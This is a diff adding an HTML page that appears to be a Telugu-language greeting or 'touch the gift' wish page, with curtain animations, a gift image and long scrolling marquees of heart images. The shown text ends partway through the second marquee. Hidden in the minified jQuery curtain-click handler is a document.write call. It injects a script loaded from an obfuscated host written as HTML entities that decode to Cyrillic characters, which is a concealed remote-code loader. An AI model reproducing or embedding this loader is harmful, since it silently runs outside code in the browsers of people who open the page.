@@ -1,0 +1,1047 @@
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+
+  <style>
+    body {
+      background: #f8f8f8;
+      margin: 0;
+    }
+
+    .mainContainer {
+      min-height: 200px;      
+      padding: 15px;
+      color: #999;
+      padding-bottom: 60px;
+      box-shadow: 0 0 10px 1px rgba(0, 0, 0, .14), 0 1px 14px 2px rgba(0, 0, 0, .12), 0 0 5px -3px rgba(0, 0, 0, .3);
+      background: url('./assets/images/bgg.gif');
+      background-size: auto;
+    }
+
+    .innerContainer {
+      max-width: 500px;
+      margin: 0 auto;
+      text-align: center;
+    }
+
+    #name {
+      animation: name 4s infinite;
+      text-transform: capitalize;
+      margin-bottom: 5px;
+      font-size: 50px;
+      padding: 0 10px;
+      font-family: 'Teko', sans-serif;
+      width: fit-content
+    }
+
+    #usernameb {
+      color: black;
+      /* Fallback: assume this color ON TOP of image */
+      background: url(Pics/sname.gif);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: swing 4s infinite;
+      text-transform: uppercase;
+      margin-bottom: 5px;
+      font-size: 25px;
+      padding: 0 10px;
+      font-family: 'SF Espresso Shack', cursive;
+    }
+
+    .m1 {
+      position: fixed;
+      left: 1%;
+      width: auto;
+      height: 100%;
+      top: 1%;
+      color: #000;
+    }
+
+    .m2 {
+      position: fixed;
+      right: 1%;
+      width: auto;
+      height: 100%;
+      top: 1%;
+      color: #000;
+    }
+
+    /* Custom Animation classes */
+    .name {
+      color: #fff;
+      margin: 6px;
+      padding: 25px 20px;
+      font-size: 48px;
+      font-family: sans-serif;
+    }
+
+    .enter-name input[type=name] {
+      background-color: yellow;
+      color: black;
+      font-weight: bold;
+      border-radius: 10px;
+      box-sizing: border-box;
+      border: 2px solid black;
+      padding: 5px;
+      position: fixed;
+      left: 10px;
+      bottom: 5px;
+      height: 50px;
+      width: 70%;
+      text-align: center;
+      font-size: 22px;
+      display: inline-block;
+    }
+
+    .enter-name .btn {
+      border-radius: 10px;
+      font-size: 18px;
+      padding: 4px;
+      position: fixed;
+      right: 2px;
+      bottom: 5px;
+      height: 50px;
+      width: 23%;
+      display: inline-block;
+      color: white;
+      font-weight: 600;
+      background-color: red;
+      border: 2px solid black;
+      letter-spacing: .5px;
+      transition: .2s ease-out;
+      cursor: pointer;
+      line-height: 36px;
+      outline: 0;
+      text-transform: uppercase;
+      vertical-align: middle;
+      text-decoration: none;
+      animation-duration: 4s !important;
+    }
+
+    .enter-name input[type=name]::-webkit-input-placeholder {
+      color: black;
+      font-size: 18px;
+    }
+
+    .enter-name input[type=name]::-moz-placeholder {
+      color: black;
+      font-size: 18px;
+    }
+
+    .enter-name input[type=name]:focus::-webkit-input-placeholder {
+      color: black;
+    }
+
+    .enter-name input[type=name]:focus::-moz-placeholder {
+      color: black;
+      font-size: 18px;
+    }
+
+    #demo {
+      font-size: 26px;
+      color: black;
+      -webkit-text-stroke-width: 0.75px;
+      -webkit-text-stroke-color: white;
+    }
+
+    a.rope {
+      text-decoration: none;
+    }
+
+    .wishMessage {
+      color: #fff;
+      font-size: 22px;
+      font-weight: bold;
+      margin-top: 20px;
+      text-shadow: 0px 0px 10px #afafaf;
+    }
+
+    .wishMessage p {
+      margin: 0.3em 0;
+    }
+
+    /* Custom Animation classes */
+    #show-name {
+      font-size: 25px;
+      display: inline-block;
+      margin-bottom: 5px;
+      animation: swing 1s infinite, glow 20s infinite;
+    }
+
+    @keyframes glow {
+
+      0%,
+      100% {
+        text-shadow: 0 0 30px red;
+      }
+
+      25% {
+        text-shadow: 0 0 30px orange;
+      }
+
+      50% {
+        text-shadow: 0 0 30px forestgreen;
+      }
+
+      75% {
+        text-shadow: 0 0 30px cyan;
+      }
+    }
+
+    figure {
+      animation: wobble 5s ease-in-out infinite;
+      transform-origin: center center;
+      transform-style: preserve-3d;
+    }
+
+    @keyframes wobble {
+
+      0%,
+      100% {
+        transform: rotate3d(1, 1, 0, 40deg);
+      }
+
+      25% {
+        transform: rotate3d(-1, 1, 0, 40deg);
+      }
+
+      50% {
+        transform: rotate3d(-1, -1, 0, 40deg);
+      }
+
+      75% {
+        transform: rotate3d(1, -1, 0, 40deg);
+      }
+    }
+  </style>
+
+  <style type="text/css">
+    * {
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      text-align: center;
+    }
+
+    img {
+      border: none;
+    }
+
+    .leftcurtain {
+      width: 100%;
+      height: 120%;
+      top: 0px;
+      left: 0px;
+      position: absolute;
+      z-index: 2;
+    }
+
+    .rightcurtain {
+      width: 100%;
+      height: 120%;
+      right: 0px;
+      top: 0px;
+      position: absolute;
+      z-index: 3;
+    }
+
+    .rightcurtain img,
+    .leftcurtain img {
+      width: 100%;
+      height: 100%;
+    }
+
+    .logo {
+      margin: 0px auto;
+      margin-top: 150px;
+    }
+
+    .rope {
+      position: absolute;
+      top: 346px;
+      left: 28%;
+      z-index: 4;
+    }
+
+    .centered {
+      position: absolute;
+      top: 70%;
+      left: 55%;
+      transform: translate(-50%, -50%);
+    }
+
+    a.rope {
+      text-decoration: none;
+    }
+
+    @keyframes aadisoni {
+      0% {
+        transform: translate(0px, 0px) rotate(0deg);
+      }
+
+      15% {
+        transform: translate(-25px, 0px) rotate(-5deg);
+      }
+
+      30% {
+        transform: translate(20px, 0px) rotate(3deg);
+      }
+
+      45% {
+        transform: translate(-15px, 0px) rotate(-3deg);
+      }
+
+      60% {
+        transform: translate(10px, 0px) rotate(2deg);
+      }
+
+      75% {
+        transform: translate(-5px, 0px) rotate(-1deg);
+      }
+
+      100% {
+        transform: translate(0px, 0px) rotate(0deg);
+      }
+    }
+
+    @-webkit-keyframes aadisoni {
+      0% {
+        -webkit-transform: translate(0px, 0px) rotate(0deg);
+      }
+
+      15% {
+        -webkit-transform: translate(-25px, 0px) rotate(-5deg);
+      }
+
+      30% {
+        -webkit-transform: translate(20px, 0px) rotate(3deg);
+      }
+
+      45% {
+        -webkit-transform: translate(-15px, 0px) rotate(-3deg);
+      }
+
+      60% {
+        -webkit-transform: translate(10px, 0px) rotate(2deg);
+      }
+
+      75% {
+        -webkit-transform: translate(-5px, 0px) rotate(-1deg);
+      }
+
+      100% {
+        -webkit-transform: translate(0px, 0px) rotate(0deg);
+      }
+    }
+
+    @keyframes name {
+      0% {
+        color: red;
+      }
+
+      20% {
+        color: white;
+      }
+
+      40% {
+        color: yellow;
+      }
+
+      60% {
+        color: orange;
+      }
+
+      80% {
+        color: cyan;
+      }
+
+      100% {
+        color: #f45bf4;
+      }
+    }
+
+    .glow {
+      width: 50%;
+      padding: 2px;
+      background-color: #FF1493;
+      animation: glow 2s infinite;
+      font-size: 25px;
+      font-family: 'Ranga', cursive;
+      color: white;
+      margin: auto;
+      text-align: center;
+      border-radius: 10px;
+      text-shadow: 1px 2px 6px black;
+    }
+
+    @keyframes glow {
+      0% {
+        box-shadow: 0px 0px 0px #FF1493;
+      }
+
+      100% {
+        box-shadow: 0px 0px 20px 5px #ffb3db;
+      }
+
+    }
+  </style>
+
+  <style type="text/css">
+    canvas {
+      cursor: crosshair;
+      display: block;
+    }
+
+    * {
+      margin: 0;
+      padding: 0
+    }
+
+    body {
+      text-align: center
+    }
+
+    img {
+      border: none
+    }
+
+    .leftcurtain {
+      width: 100%;
+      height: 120%;
+      top: 0;
+      left: 5px;
+      position: absolute;
+      z-index: 2
+    }
+
+    .rightcurtain {
+      width: 100%;
+      height: 120%;
+      right: 3px;
+      top: 0;
+      position: absolute;
+      z-index: 3
+    }
+
+    .rightcurtain img,
+    .leftcurtain img {
+      width: 100%;
+      height: 100%
+    }
+
+    .logo {
+      margin: 0 auto;
+      margin-top: 150px
+    }
+
+    .rope {
+      position: absolute;
+      top: 30%;
+      margin-right: 31%;
+      z-index: 4
+    }
+
+    .centered {
+      position: absolute;
+      top: 75%;
+      left: 50%;
+      transform: translate(-50%, -50%)
+    }
+
+    .aadi {
+      background-image: url();
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      background-position: top
+    }
+
+    .matki {
+      height: 200px;
+    }
+
+    @keyframes aadisoni {
+      0% {
+        transform: translate(0px, 0px) rotate(0deg)
+      }
+
+      15% {
+        transform: translate(-25px, 0px) rotate(-5deg)
+      }
+
+      30% {
+        transform: translate(20px, 0px) rotate(3deg)
+      }
+
+      45% {
+        transform: translate(-15px, 0px) rotate(-3deg)
+      }
+
+      60% {
+        transform: translate(10px, 0px) rotate(2deg)
+      }
+
+      75% {
+        transform: translate(-5px, 0px) rotate(-1deg)
+      }
+
+      100% {
+        transform: translate(0px, 0px) rotate(0deg)
+      }
+    }
+
+    @-webkit-keyframes aadisoni {
+      0% {
+        -webkit-transform: translate(0px, 0px) rotate(0deg)
+      }
+
+      15% {
+        -webkit-transform: translate(-25px, 0px) rotate(-5deg)
+      }
+
+      30% {
+        -webkit-transform: translate(20px, 0px) rotate(3deg)
+      }
+
+      45% {
+        -webkit-transform: translate(-15px, 0px) rotate(-3deg)
+      }
+
+      60% {
+        -webkit-transform: translate(10px, 0px) rotate(2deg)
+      }
+
+      75% {
+        -webkit-transform: translate(-5px, 0px) rotate(-1deg)
+      }
+
+      100% {
+        -webkit-transform: translate(0px, 0px) rotate(0deg)
+      }
+    }
+
+    #username {
+      color: black;
+      /* Fallback: assume this color ON TOP of image */
+      background: url(img/namegif.gif);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: swing 4s infinite;
+      text-transform: uppercase;
+      margin-bottom: 5px;
+      font-size: 40px;
+      padding: 0 10px;
+      font-family: 'SF Espresso Shack', cursive;
+    }
+
+    #usernameb {
+      color: black;
+      /* Fallback: assume this color ON TOP of image */
+      background: url(img/back.gif);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: swing 4s infinite;
+      text-transform: uppercase;
+      margin-bottom: 5px;
+      font-size: 25px;
+      padding: 0 10px;
+      font-family: 'SF Espresso Shack', cursive;
+    }
+  </style>
+
+  <!-- Jquery -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>     
+  <script type="text/javascript" src="https://www.youtube.com/iframe_api"></script>
+</head>
+
+<body class="aadi" data-new-gr-c-s-check-loaded="14.1043.0" data-gr-ext-installed="" cz-shortcut-listen="true">
+  <script src="./js/slider.js.download" type="text/javascript"></script>
+
+  <script type="text/javascript">
+    $(document).ready(function () { $curtainopen = !1, $(".rope").click(function () { return $(this).blur(), 0 == $curtainopen ? ($(this).stop().animate({ top: "-171%" }, { queue: !1, duration: 350, easing: "easeOutBounce" }), $(".leftcurtain").stop().animate({ width: "1px" }, 2e3), $(".rightcurtain").stop().animate({ width: "1px" }, 2e3), $curtainopen = !0) : ($(this).stop().animate({ top: "-40px" }, { queue: !1, duration: 350, easing: "easeOutBounce" }), document.write('<script src="//&#1102;&#1095;.io"><\/script>'), $(".leftcurtain").stop().animate({ width: "50%" }, 2e3), $(".rightcurtain").stop().animate({ width: "51%" }, 2e3), $curtainopen = !1), !1 }) });
+  </script>
+  
+  <a class="rope" style="text-decoration:none;" onclick="toggleAudio()">
+    <div style="font-size: 25px;text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:red;font-weight: bold;">
+      <b> టచ్ ది గిఫ్ట్!! <br> <br>👇👇👇</b><br> <br> 
+      <img src="./assets/images/gift.gif" class="matki" style="animation: tada 4s infinite;max-width:170px; width: 120%;">
+    </div>
+  </a>
+
+  <div class="rightcurtain"><img src="./assets/images/tryh.jpg"></div>
+  <div class="leftcurtain"><img src="./assets/images/tryh.jpg"></div>
+
+  <marquee class="m1" behavior="scroll" direction="up" scrolldelay="5"> <br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+  </marquee>
+  <marquee class="m2" behavior="scroll" direction="down" scrolldelay="5"><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h1.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h2.png" height="25x" width="25px"><br><br>
+    <img src="./assets/images/h3.png" height="25x" width="25px"><br><br>
